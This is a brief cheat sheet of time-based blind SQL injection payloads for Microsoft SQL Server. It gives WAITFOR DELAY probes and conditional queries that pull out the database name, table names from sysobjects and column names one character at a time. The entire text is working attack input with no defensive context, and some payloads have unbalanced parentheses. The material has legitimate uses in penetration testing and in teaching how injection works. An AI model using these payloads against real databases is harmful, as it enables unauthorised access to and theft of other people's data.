Microsoft SQL injection blind database dump
'WAITFOR DELAY '0:0:10'

'%20waitfor%20delay'0%3a0%3a25'--

MS sql DB

DB Length= 'IF(LEN(DB_NAME()))+>+1+WAITFOR+DELAY+'00:00:10'--

DB Name= 'IF(SUBSTRING(DB_NAME(),1,1))+>+'a'+WAITFOR+DELAY+'00:00:10'--

Table Length= 'IF(LEN((SELECT+TOP+1+NAME+FROM+sysobjects+WHERE+xtype='U'))+>+1)+WAITFOR+DELAY+'00:00:10'--

Table Name= 'IF(SUBSTRING((SELECT+TOP+1+NAME+FROM+sysobjects+WHERE+xtype='U'),1,1))+>+'a'+WAITFOR+DELAY+'00:00:10'--

Column Name = 'IF(SUBSTRING((SELECT+TOP+1+name+FROM+sys.columns+WHERE+object_id=OBJECT_ID('your_table_name')),1,1))>+'a'+WAITFOR+DELAY+'00:00:10'--
